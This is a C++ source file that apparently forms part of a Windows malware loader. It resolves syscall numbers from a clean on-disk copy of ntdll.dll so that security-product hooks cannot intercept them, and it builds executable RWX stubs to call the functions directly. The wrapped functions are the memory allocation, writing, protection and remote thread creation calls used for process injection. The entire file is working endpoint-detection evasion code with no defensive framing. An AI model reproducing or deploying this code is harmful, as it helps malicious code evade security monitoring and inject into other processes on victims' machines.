#include "syscalls.h"

#include <cstdint>
#include <cstring>
#include <string>
#include <vector>

// Direct dynamic syscalls.
//
// System service numbers are resolved from a *clean* copy of ntdll.dll read off
// disk (C:\Windows\System32\ntdll.dll) so that user-mode hooks/patches on the
// live ntdll image do not poison the resolved SSNs. A tiny executable stub
// (mov r10, rcx; mov eax, <ssn>; syscall; ret) is generated per syscall, so the
// `syscall` instruction executes from our own memory instead of jumping into
// ntdll.

namespace syscall {

using NtFn = NTSTATUS(NTAPI*)();

static NtFn g_NtAllocateVirtualMemory = nullptr;
static NtFn g_NtProtectVirtualMemory  = nullptr;
static NtFn g_NtWriteVirtualMemory    = nullptr;
static NtFn g_NtCreateThreadEx        = nullptr;
static NtFn g_NtWaitForSingleObject   = nullptr;
static NtFn g_NtClose                 = nullptr;
static NtFn g_NtFreeVirtualMemory     = nullptr;

static std::vector<uint8_t> g_ntdllFile;   // keeps the clean disk copy alive during init
static std::vector<void*>    g_stubPages;  // keeps stub allocations referenced

// ---------------------------------------------------------------------------
// PE parsing helpers
// ---------------------------------------------------------------------------

static uint32_t RvaToFileOffset(PIMAGE_NT_HEADERS64 nt, uint32_t rva)
{
    if (rva < nt->OptionalHeader.SizeOfHeaders)
        return rva;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        uint32_t va  = sec[i].VirtualAddress;
        uint32_t raw = sec[i].PointerToRawData;
        uint32_t end = (sec[i].Misc.VirtualSize > sec[i].SizeOfRawData)
                           ? sec[i].Misc.VirtualSize
                           : sec[i].SizeOfRawData;
        if (rva >= va && rva < va + end)
            return raw + (rva - va);
    }
    return 0;
}

static void* RvaPtr(uintptr_t base, PIMAGE_NT_HEADERS64 nt, uint32_t rva, bool isFile)
{
    return reinterpret_cast<void*>(base + (isFile ? RvaToFileOffset(nt, rva) : rva));
}

// Returns the export RVA of `name`, or 0 if not found.
static uint32_t GetExportRva(uintptr_t base, const char* name, bool isFile)
{
    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
    auto* nt  = reinterpret_cast<PIMAGE_NT_HEADERS64>(base + dos->e_lfanew);

    uint32_t expRva =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRva)
        return 0;

    auto* exp   = static_cast<PIMAGE_EXPORT_DIRECTORY>(RvaPtr(base, nt, expRva, isFile));
    auto* names = static_cast<uint32_t*>(RvaPtr(base, nt, exp->AddressOfNames, isFile));
    auto* ords  = static_cast<uint16_t*>(RvaPtr(base, nt, exp->AddressOfNameOrdinals, isFile));
    auto* funcs = static_cast<uint32_t*>(RvaPtr(base, nt, exp->AddressOfFunctions, isFile));

    for (uint32_t i = 0; i < exp->NumberOfNames; ++i) {
        const char* fn = static_cast<const char*>(RvaPtr(base, nt, names[i], isFile));
        if (std::strcmp(fn, name) == 0)
            return funcs[ords[i]];
    }
    return 0;
}

// Scans a ntdll syscall stub for the SSN. Typical x64 stub:
//   4C 8B D1          mov r10, rcx
//   B8 <ssn>          mov eax, <ssn>
//   0F 05             syscall
//   C3                ret
static uint16_t ExtractSsn(uintptr_t base, uint32_t rva, bool isFile)
{
    auto* dos  = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
    auto* nt   = reinterpret_cast<PIMAGE_NT_HEADERS64>(base + dos->e_lfanew);
    auto* code = static_cast<uint8_t*>(RvaPtr(base, nt, rva, isFile));

    for (int i = 0; i < 32; ++i) {
        if (code[i]     == 0x4C && code[i + 1] == 0x8B &&
            code[i + 2] == 0xD1 && code[i + 3] == 0xB8) {
            return *reinterpret_cast<uint16_t*>(code + i + 4);
        }
    }
    return 0;
}

// Allocates an executable stub that performs the direct syscall for a given SSN.
static NtFn BuildStub(uint16_t ssn)
{
    uint8_t bytes[] = {
        0x4C, 0x8B, 0xD1,                                    // mov r10, rcx
        0xB8, static_cast<uint8_t>(ssn), static_cast<uint8_t>(ssn >> 8), 0x00, 0x00, // mov eax, ssn
        0x0F, 0x05,                                          // syscall
        0xC3                                                 // ret
    };

    void* mem = VirtualAlloc(nullptr, sizeof(bytes),
                             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem)
        return nullptr;

    std::memcpy(mem, bytes, sizeof(bytes));
    g_stubPages.push_back(mem);
    return reinterpret_cast<NtFn>(mem);
}

// ---------------------------------------------------------------------------
// Initialization
// ---------------------------------------------------------------------------

bool Initialize()
{
    if (g_NtAllocateVirtualMemory)
        return true; // already initialized

    uintptr_t base   = 0;
    bool      isFile = true;

    wchar_t sysDir[MAX_PATH];
    UINT len = GetSystemDirectoryW(sysDir, MAX_PATH);
    if (len && len < MAX_PATH) {
        std::wstring path = std::wstring(sysDir) + L"\\ntdll.dll";
        HANDLE f = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
                               nullptr, OPEN_EXISTING, 0, nullptr);
        if (f != INVALID_HANDLE_VALUE) {
            DWORD size = GetFileSize(f, nullptr);
            g_ntdllFile.resize(size);
            DWORD read = 0;
            if (ReadFile(f, g_ntdllFile.data(), size, &read, nullptr) && read == size) {
                base = reinterpret_cast<uintptr_t>(g_ntdllFile.data());
            } else {
                g_ntdllFile.clear();
            }
            CloseHandle(f);
        }
    }

    if (!base) {
        // Fallback: resolve SSNs from the in-memory ntdll image.
        base   = reinterpret_cast<uintptr_t>(GetModuleHandleW(L"ntdll.dll"));
        isFile = false;
    }

    auto resolveSsn = [&](const char* name) -> uint16_t {
        uint32_t rva = GetExportRva(base, name, isFile);
        return rva ? ExtractSsn(base, rva, isFile) : 0;
    };

    g_NtAllocateVirtualMemory = BuildStub(resolveSsn("NtAllocateVirtualMemory"));
    g_NtProtectVirtualMemory  = BuildStub(resolveSsn("NtProtectVirtualMemory"));
    g_NtWriteVirtualMemory    = BuildStub(resolveSsn("NtWriteVirtualMemory"));
    g_NtCreateThreadEx        = BuildStub(resolveSsn("NtCreateThreadEx"));
    g_NtWaitForSingleObject   = BuildStub(resolveSsn("NtWaitForSingleObject"));
    g_NtClose                 = BuildStub(resolveSsn("NtClose"));
    g_NtFreeVirtualMemory     = BuildStub(resolveSsn("NtFreeVirtualMemory"));

    return g_NtAllocateVirtualMemory && g_NtProtectVirtualMemory &&
           g_NtWriteVirtualMemory && g_NtCreateThreadEx &&
           g_NtWaitForSingleObject && g_NtClose && g_NtFreeVirtualMemory;
}

// ---------------------------------------------------------------------------
// Wrappers (x64 Windows calling convention: rcx, rdx, r8, r9, stack)
// ---------------------------------------------------------------------------

NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
{
    using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    return reinterpret_cast<Fn>(g_NtAllocateVirtualMemory)(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect)
{
    using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    return reinterpret_cast<Fn>(g_NtProtectVirtualMemory)(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten)
{
    using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    return reinterpret_cast<Fn>(g_NtWriteVirtualMemory)(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList)
{
    using Fn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
    return reinterpret_cast<Fn>(g_NtCreateThreadEx)(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

NTSTATUS NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout)
{
    using Fn = NTSTATUS(NTAPI*)(HANDLE, BOOLEAN, PLARGE_INTEGER);
    return reinterpret_cast<Fn>(g_NtWaitForSingleObject)(Handle, Alertable, Timeout);
}

NTSTATUS NtClose(HANDLE Handle)
{
    using Fn = NTSTATUS(NTAPI*)(HANDLE);
    return reinterpret_cast<Fn>(g_NtClose)(Handle);
}

NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType)
{
    using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG);
    return reinterpret_cast<Fn>(g_NtFreeVirtualMemory)(ProcessHandle, BaseAddress, RegionSize, FreeType);
}

} // namespace syscall
